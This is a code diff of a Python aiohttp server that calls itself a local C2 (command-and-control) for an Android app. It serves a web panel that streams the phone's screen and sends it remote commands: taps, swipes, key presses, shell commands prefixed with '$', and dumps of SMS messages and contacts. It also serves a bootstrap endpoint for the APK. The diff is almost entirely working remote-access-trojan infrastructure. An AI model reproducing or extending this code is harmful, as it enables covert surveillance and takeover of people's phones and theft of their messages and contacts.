@@ -1,9 +1,7 @@
-# server.py - C2 local para o app aval
-import asyncio, base64, json, threading
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import websockets
+# server.py - C2 local em porta unica: painel em / , celular em /ws , viewer em /panel
+import asyncio, base64, json
+from aiohttp import web, WSMsgType
 
-LOOP = None
 PHONES = set()
 VIEWERS = set()
 INFO = {}
@@ -16,6 +14,7 @@ body{margin:0;background:#111;color:#ddd;font:13px system-ui;display:flex;height
 button{background:#2b2b2b;color:#ddd;border:1px solid #444;padding:4px 8px;cursor:pointer}
 button:hover{background:#3a3a3a}
 #img{flex:1;object-fit:contain;background:#000;min-height:0;cursor:crosshair}
+#st{padding:3px 6px;font:11px monospace;color:#f66;min-height:14px}
 #right{width:320px;display:flex;flex-direction:column;border-left:1px solid #333}
 #log{flex:1;overflow:auto;padding:6px;font:11px monospace;white-space:pre-wrap;word-break:break-all}
 #row{padding:6px;display:flex;gap:4px;align-items:center}
@@ -30,6 +29,7 @@ input[type=text]{flex:1;background:#222;color:#ddd;border:1px solid #444;padding
 <button onclick="cmd('sms',{})">SMS</button><button onclick="cmd('contacts',{})">Contatos</button>
 </div>
 <img id="img">
+<div id="st"></div>
 <div id="row"><input id="txt" type="text" placeholder="texto, ou $comando para shell"><button onclick="send()">Enviar</button></div>
 </div>
 <div id="right">
@@ -38,19 +38,21 @@ input[type=text]{flex:1;background:#222;color:#ddd;border:1px solid #444;padding
 <div id="log"></div>
 </div>
 <script>
-let ws,info={w:0,h:0};
-const img=document.getElementById('img'),log=document.getElementById('log');
+let ws,info={w:0,h:0},lastF=0;
+const img=document.getElementById('img'),log=document.getElementById('log'),st=document.getElementById('st');
 function add(s){log.textContent+=s+"\n";log.scrollTop=log.scrollHeight}
 function connect(){
-ws=new WebSocket('ws://'+location.hostname+':8081');
+const p=location.protocol==='https:'?'wss:':'ws:';
+ws=new WebSocket(p+'//'+location.host+'/panel');
 ws.onopen=()=>add('[painel conectado]');
 ws.onclose=()=>{add('[desconectado]');setTimeout(connect,2000)};
 ws.onmessage=e=>{const m=JSON.parse(e.data);
-  if(m.k==='frame'){img.src='data:image/jpeg;base64,'+m.d}
+  if(m.k==='frame'){lastF=Date.now();st.textContent='';img.src='data:image/jpeg;base64,'+m.d}
   else if(m.k==='log'){const d=m.d;
    if(d.t==='hello'){info=d;add('['+d.id+'] '+d.m+' sdk'+d.sdk+' '+d.w+'x'+d.h+' bat'+d.bat)}
    else add(d.t+': '+(d.o||''))}};
 }
+setInterval(()=>{if(!lastF||Date.now()-lastF>2500)st.textContent='sem frames do celular'},1000);
 function cmd(c,x){if(ws&&ws.readyState===1)ws.send(JSON.stringify(Object.assign({c},x)))}
 function k(code){cmd('key',{code})}
 function send(){const t=document.getElementById('txt'),v=t.value.trim();if(!v)return;
@@ -69,58 +71,85 @@ Math.abs(u.x-down.x)<12&&Math.abs(u.y-down.y)<12
   :cmd('swipe',{x1:down.x,y1:down.y,x2:u.x,y2:u.y,ms:260});down=null});
 connect();
 </script></body></html>"""
-class H(BaseHTTPRequestHandler):
-    def do_GET(self):
-        b = PAGE.encode()
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(b)))
-        self.end_headers()
-        self.wfile.write(b)
-    def log_message(self, *a): pass
 
-def push(o):
-    if not VIEWERS or LOOP is None: return
+
+async def _s(ws, d):
+    try:
+        await ws.send_str(d)
+    except Exception:
+        pass
+
+
+async def push(o):
+    if not VIEWERS:
+        return
     d = json.dumps(o)
-    for v in list(VIEWERS):
-        asyncio.run_coroutine_threadsafe(v.send(d), LOOP)
+    await asyncio.gather(*[_s(v, d) for v in list(VIEWERS)])
 
-async def phone(ws):
+
+async def push_log(o):
+    await push({"k": "log", "d": o})
+
+
+async def index(req):
+    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")
+
+
+async def phone(req):
+    # GET simples em /ws devolve a URL ws a usar (bootstrap do apk)
+    if req.headers.get("Upgrade", "").lower() != "websocket":
+        host = req.headers.get("Host", "localhost:8080")
+        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
+        return web.Response(text=("wss://" if tls else "ws://") + host + "/ws\n")
+
+    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0)
+    await ws.prepare(req)
     PHONES.add(ws)
     print("+ celular conectado")
-    push({"k": "log", "d": {"t": "info", "o": "celular conectado"}})
-    try:
-        async for m in ws:
-            if isinstance(m, bytes):
-                push({"k": "frame", "d": base64.b64encode(m).decode()})
-            else:
-                try: o = json.loads(m)
-                except Exception: o = {"t": "raw", "o": m}
-                if o.get("t") == "hello": INFO.update(o)
-                push({"k": "log", "d": o})
-    finally:
-        PHONES.discard(ws)
-        print("- celular desconectado")
-        push({"k": "log", "d": {"t": "info", "o": "celular desconectado"}})
+    await push_log({"t": "info", "o": "celular conectado"})
+    async for m in ws:
+        if m.type == WSMsgType.BINARY:
+            await push({"k": "frame", "d": base64.b64encode(m.data).decode()})
+        elif m.type == WSMsgType.TEXT:
+            try:
+                o = json.loads(m.data)
+            except Exception:
+                o = {"t": "raw", "o": m.data}
+            if o.get("t") == "hello":
+                INFO.update(o)
+            await push_log(o)
+    PHONES.discard(ws)
+    print("- celular desconectado")
+    await push_log({"t": "info", "o": "celular desconectado"})
+    return ws
 
-async def viewer(ws):
+
+async def panel(req):
+    ws = web.WebSocketResponse(heartbeat=20)
+    await ws.prepare(req)
     VIEWERS.add(ws)
-    try:
-        async for m in ws:
-            for p in list(PHONES):
-                try: await p.send(m)
-                except Exception: pass
-    finally:
-        VIEWERS.discard(ws)
+    if INFO:
+        await _s(ws, json.dumps({"k": "log", "d": INFO}))
+    async for m in ws:
+        if m.type != WSMsgType.TEXT:
+            continue
+        for p in list(PHONES):
+            try:
+                await p.send_str(m.data)
+            except Exception:
+                pass
+    VIEWERS.discard(ws)
+    return ws
 
-async def main():
-    global LOOP
-    LOOP = asyncio.get_running_loop()
-    threading.Thread(
-        target=lambda: HTTPServer(("0.0.0.0", 8082), H).serve_forever(), daemon=True
-    ).start()
-    async with websockets.serve(phone, "0.0.0.0", 8080), websockets.serve(viewer, "0.0.0.0", 8081):
-        print("painel -> http://localhost:8082")
-        await asyncio.Future()
 
-asyncio.run(main())
+def main():
+    app = web.Application()
+    app.router.add_get("/", index)
+    app.router.add_get("/ws", phone)
+    app.router.add_get("/panel", panel)
+    app.router.add_get("/health", lambda r: web.Response(text="ok"))
+    print("painel -> http://localhost:8080/")
+    web.run_app(app, host="0.0.0.0", port=8080, print=None)
+
+
+main()
